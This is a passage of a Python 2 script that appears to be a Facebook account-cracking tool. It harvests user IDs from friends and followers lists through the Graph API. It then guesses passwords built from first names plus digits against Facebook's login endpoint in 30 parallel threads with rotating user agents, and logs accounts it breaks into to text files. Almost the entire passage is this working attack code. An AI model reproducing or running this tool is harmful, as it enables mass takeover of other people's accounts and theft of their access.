            print ('\t Invalid user \x1b[0;97m')
            raw_input(' \x1b[1;92mPress enter to try again \x1b[1;97m')
            fast_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif f_s == '2':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;93m~~~Name Pass Followers Cracking ~~~\x1b[1;97m')
        print (47 * '-')
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m~~~~ Name + Digit Pass Followers Cracking ~~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print (' \x1b[1;92mCloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input('\x1b[1;92mPress enter to try again \x1b[1;97m')
            fast_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif f_s == '3':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~ Name + Digit Pass File Cracking ~~~~\x1b[1;97m')
        print (47 * '-')
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        try:
            idlist = raw_input(' \x1b[1;96m[+] File Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print ('[!] File Not Found.')
            raw_input('\x1b[1;92mPress Enter To Back. \x1b[1;97m')
            fast_crack()

    elif f_s == '0':
        jutt_menu()
    else:
        print ('')
        print ('\x1b[1;37mChoose valid option')
        fc_s()
    print (' \x1b[1;92mTotal ids: \x1b[1;92m ' + str(len(id)))
    time.sleep(0.5)
    print ('\033[1;97mCrack Running\033[1;97m')
    time.sleep(0.5)
    print (47 * '-')
    print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
    time.sleep(0.5)
    print (47 * '-')
    def main(arg):
        user = arg
        uid, name = user.split('|')
        ua = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ua})
        try:
            pass1 = name.lower() + p1
            data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m')
                ok = open('JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m')
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    ok = open('JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        ok = open('JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            ok = open('JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m')
                                ok = open('JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m')
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m')
                                    ok = open('JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m')
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m')
                                        ok = open('JUTT_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m')
                                        cp = open('JUTT_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                                        q = json.loads(data)
                                        if 'access_token' in q:
                                            print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m')
                                            ok = open('JUTT_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m')
                                            cp = open('JUTT_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print (47 * '-')
    print (' \x1b[1;92mCrack Done')
    print (' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps)))
    print (47 * '\x1b[1;97m-')
    raw_input(' \x1b[1;93mPress enter to back\x1b[1;97m')
    brand_menu()


def dolfan_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print (logo)
        print ('\t Login FB id to continue\x1b[0;97m')
        print ('')
        time.sleep(1)
        log_menu()

    os.system('clear')
    print (logo)
    print("")
    print ('\x1b[1;93m~~~Without Localhost Cloning Menu~~~\x1b[1;97m')
    print (47*'-')
    print ('\x1b[1;33m~~~~ Name Pass Cracking ~~~~\x1b[1;97m')
    print (47 * '-')
    print ('\x1b[1;92m[1] Public id cloning')
    print ('\x1b[1;92m[2] Followers cloning')
    print ('\x1b[1;92m[3] File cloning')
    print ('\x1b[1;92m[0] Back\x1b[1;97m')
    print (47 * '-')
    dlfn_s()


def dlfn_s():
    id = []
    cps = []
    oks = []
    dol_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Jutt\xe2\x9e\xa4 ')
    if dol_s == '1':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~Without Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~ Name Pass Public Cracking ~~~~\x1b[1;97m')
        print (47 * '-')
        print ('\x1b[1;96mFor example:123,1234,12345,786,12,1122\x1b[1;97m')
        print (47 * '-')
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~Without Localhost Cloning Menu~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m~~~~Name Pass Public Cracking~~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print (' \x1b[1;92mCloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input(' \x1b[1;92mPress enter to try again \x1b[1;97m')
            dolfan_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif dol_s == '2':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~Without Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~Name Pass Followers Cracking~~~~\x1b[1;97m')
        print (47 * '-')
        print (' \x1b[1;96mFor example:123,1234,12345,786,12,1122\x1b[1;97m')
        print (47 * '-')
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m~~~~Name Pass Followers Cracking~~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print (' \x1b[1;92mCloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input('\x1b[1;92mPress enter to try again \x1b[1;97m')
            dolfan_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif dol_s == '3':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~Without Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~Name Pass File Cracking ~~~~\x1b[1;97m')
        print (47 * '-')
        print ('\x1b[1;96mFor example:123,1234,12345,786,12,1122\x1b[1;97m')
        print (47 * '-')
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        try:
            idlist = raw_input('\x1b[1;96m[+] File Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print ('[!] File Not Found.')
            raw_input('\x1b[1;92mPress Enter To Back. \x1b[1;97m')
            dolfan_crack()

    elif dol_s == '0':
        menu()
    else:
        print ('')
        print ('\x1b[1;37mChoose valid option')
        dlfn_s()
    print ('\x1b[1;92m Total ids: ' + str(len(id)))
    time.sleep(0.5)
    print (' \x1b[1;97mCrack Running\x1b[1;97m ')
    time.sleep(0.5)
    print (47 * '-')
    print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
    time.sleep(0.5)
    print (47 * '-')
    def main(arg):
        user = arg
        uid, name = user.split('|')
        ua = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ua})
        try:
            pass1 = name.lower() + p1
            data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m')
                ok = open('JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m')
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    ok = open('JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        ok = open('JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            ok = open('JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print (47 * '-')
    print (' \x1b[1;92mCrack Done')
    print (' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps)))
    print (47 * '\033[1;97m-')
    raw_input(' \x1b[1;93mPress enter to back\x1b[1;97m')
    brand_menu()


reload(sys)
sys.setdefaultencoding('utf-8')
def juttex_menu():
    os.system('clear')
    try:
        __cindy__ = open('access_token.txt', 'r').read()
    except IOError:
        os.system('clear')
        print ('\n %s[%s!%s] token/cookies invalid' % (N, M, N))
        time.sleep(1)
        os.system('rm -rf access_token.txt')
        log_menu()

    try:
        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s' % __cindy__)
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        idfb = jaoanzjwowj['id']
    except KeyError:
        os.system('clear')
        print ('\n %s[%s!%s] token/cookies invalid' % (N, M, N))
        time.sleep(1)
        os.system('rm -rf access_token.txt')
        log_menu()
    except requests.exceptions.ConnectionError:
        print ('\n\n %s[%s!%s] tidak ada koneksi\n' % (N, M, N))
        exit()

    os.system('clear')
    print (logo)
    print (' ')
    print (' [*] Id Facebook: %s%s%s' % (H, idfb, N))
    print (' [*] ---------------------------------------------')
    print ('')
    print (' %s[ Welcome %s%s%s ]\n' % (N, K, nama, N))
    print (' %s[1].Dump ids %sOnly %s/ %sNEW%s' % (N, warna1, warna2, warna3, N))
    print (' %s[2].Dump ids %sAll %sOld New %sMix%s' % (M, warna1, warna2, warna3, H))
    print (' %s[3].Dump id %sFrom %sTotal %sFollowers%s' % (K, warna1, warna2, warna3, H))
    print (' %s[4].Dump id %sFrom %sTimeline Post %sLikes%s' % (N, warna1, warna2, warna3, M))
    print (' %s[0].Back %sCloning %s/ %sMenu%s' % (O, warna1, warna2, warna3, B))
    juttex_select()


def juttex_select():
    sel = raw_input('\n [*] menu : ')
    if sel == '1':
        newex()
    elif sel == '2':
        allex()
    elif sel == '3':
        fex()
    elif sel == '4':
        postex()
    elif sel == '0':
        jutt_menu()
    else:
        print ('\n %s[%s\xc3\x97%s] wrong input' % (N, M, N))
        time.sleep(1)
        os.system('clear')
        juttex_menu()


def newex():
    try:
        __cindy__ = open('access_token.txt', 'r').read()
    except IOError:
        os.system('clear')
        print ('\n %s[%s!%s] token/cookies invalid' % (N, M, N))
        time.sleep(1)
        os.system('rm -rf access_token.txt')
        log_menu()

    os.system('clear')
    print (logo)
    print ('')
    print (' %s~~~~~Dump %sOnly %sNew %sids~~~~~%s' % (N, warna1, warna2, warna3, O))
    print (47*'-')
    try:
        idt = raw_input('\n [?] id public  : ')
        asw = "5000"
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (idt, asw, __cindy__))
        id = []
        z = json.loads(xxx.text)
        ppk = ('.out' + '.txt').replace(' ', '_')
        ys = open(ppk, 'w')
        for a in z['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print ('\r' + w + ' [*] total dump : %s ' % str(len(id))),
            sys.stdout.flush()
            time.sleep(0.001)

        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] successful dump id from public friends' % (N, H, N))
        print (47 * '-')
        print ('')
        raw_input("Press Enter to download")
        os.system('cat .out.txt | grep "1000726" >> /sdcard/NEWIDS.txt')
        os.system('cat .out.txt | grep "1000727" >> /sdcard/NEWIDS.txt')
        os.system('cat .out.txt | grep "1000728" >> /sdcard/NEWIDS.txt')
        os.system('cat .out.txt | grep "1000729" >> /sdcard/NEWIDS.txt')
        os.system('cat .out.txt | grep "100073" >> /sdcard/NEWIDS.txt')
        print (' %sYour %sFile %sis %sSave > /sdcard/NEWIDS.txt%s' % (O, warna1, warna2, warna3, H))
        raw_input(' %sPress %sEnter %sTo %sBack%s' % (N, warna1, warna2, warna3, K))
        os.system('rm -rf .out.txt')
        juttex_menu()
    except IOError:
        print ('\n %s[%s!%s] Failed dump id Please Enter Public id' % (N, M, N))
        os.remove(ppk)
        time.sleep(1)
        juttex_menu()


def allex():
    try:
        __cindy__ = open('access_token.txt', 'r').read()
    except IOError:
        os.system('clear')
        print ('\n %s[%s!%s] token/cookies invalid' % (N, M, N))
        time.sleep(1)
        os.system('rm -rf access_token.txt')
        log_menu()

    os.system('clear')
    print (logo)
    print ('')
    print (' %s~~~~~Dump %sOld %sNew All %sids~~~~~%s' % (N, warna1, warna2, warna3, O))
    print (47*'-')
    try:
        idt = raw_input('\n [?] id public  : ')
        asw = raw_input(' [?] limit id   : ')
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (idt, asw, __cindy__))
        id = []
        z = json.loads(xxx.text)
        ppk = ('.out' + '.txt').replace(' ', '_')
        ys = open(ppk, 'w')
        for a in z['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print ('\r' + w + ' [*] total dump : %s ' % str(len(id))),
            sys.stdout.flush()
            time.sleep(0.001)

        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] successful dump id from public friends' % (N, H, N))
        print (47 * '-')
        raw_input('%s [%s PRESS ENTER TO DOWNLOAD%s ]' % (K, O, K))
        ptu = "10"
        os.system('cat .out.txt | grep '+ ptu +' >> /sdcard/ALLIDS.txt')
        os.system('rm -rf .out.txt')
        print (' %sYour %sFile %sis %sSave > /sdcard/ALLIDS.txt%s' % (O, warna1, warna2, warna3, H))
        raw_input(' %sPress %sEnter %sTo %sBack%s' % (N, warna1, warna2, warna3, K))
        juttex_menu()
    except IOError:
        print ('\n %s[%s!%s] Failed dump id Please Enter Public id' % (N, M, N))
        os.remove(ppk)
        time.sleep(1)
        juttex_menu()


def fex():
    try:
        __cindy__ = open('access_token.txt', 'r').read()
    except IOError:
        os.system('clear')
        print ('\n %s[%s!%s] token/cookies invalid' % (N, M, N))
        time.sleep(1)
        os.system('rm -rf access_token.txt')
        log_menu()

    os.system('clear')
    print (logo)
    print ('')
    print (' %s~~~~~Dump %sids %sFrom %sFollowers~~~~~%s' % (N, warna1, warna2, warna3, H))
    print (47*'-')
    try:
        idt = raw_input('\n [?] id follow  : ')
